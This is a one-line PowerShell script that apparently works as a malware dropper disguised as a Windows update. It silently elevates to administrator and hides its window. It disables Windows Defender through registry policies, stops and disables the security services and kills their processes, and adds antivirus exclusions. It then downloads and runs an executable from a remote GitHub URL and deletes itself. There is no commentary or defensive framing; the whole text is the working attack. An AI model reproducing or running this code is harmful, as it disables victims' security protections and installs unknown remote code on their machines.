$u="https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe";$f="C:\ProgramData\WindowsUpdate";$p="$f\windows_update.exe";if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`"";exit};Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';$c=[C.W]::GetConsoleWindow();[C.W]::ShowWindow($c,0);try{if(-not(Test-Path $f)){New-Item -ItemType Directory -Path $f -Force};irm -Uri $u -OutFile $p -UserAgent "Mozilla/5.0";@("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")|%{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}};@(@{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";Name="DisableAntiSpyware";Value=1;Type="DWord"},@{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";Name="DisableRealtimeMonitoring";Value=1;Type="DWord"})|%{try{Set-ItemProperty -Path $_.Path -Name $_.Name -Value $_.Value -Type $_.Type -Force}catch{}};"WinDefend","WdNisSvc","Sense","SecurityHealthService"|%{try{Stop-Service -Name $_ -Force;Set-Service -Name $_ -StartupType Disabled;Start-Process -FilePath "sc" -ArgumentList "config",$_, "start=", "disabled" -Wait -WindowStyle Hidden}catch{}};"MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe"|%{try{Get-Process -Name $_.Replace(".exe","") -ErrorAction SilentlyContinue|Stop-Process -Force}catch{}};$e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";if(!(Test-Path $e)){New-Item -Path $e -Force|Out-Null};try{New-ItemProperty -Path $e -Name $p -PropertyType String -Value "0" -Force;New-ItemProperty -Path $e -Name $f -PropertyType String -Value "0" -Force}catch{};Start-Sleep -Seconds 2;try{$w=[WmiClass]"\\localhost\root\cimv2:Win32_Process";$r=$w.Create("`"$p`"")}catch{try{Start-Process -FilePath $p -WindowStyle Hidden}catch{}};Start-Sleep -Seconds 3;$sp=$MyInvocation.MyCommand.Path;if(Test-Path $sp){Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden}}catch{}
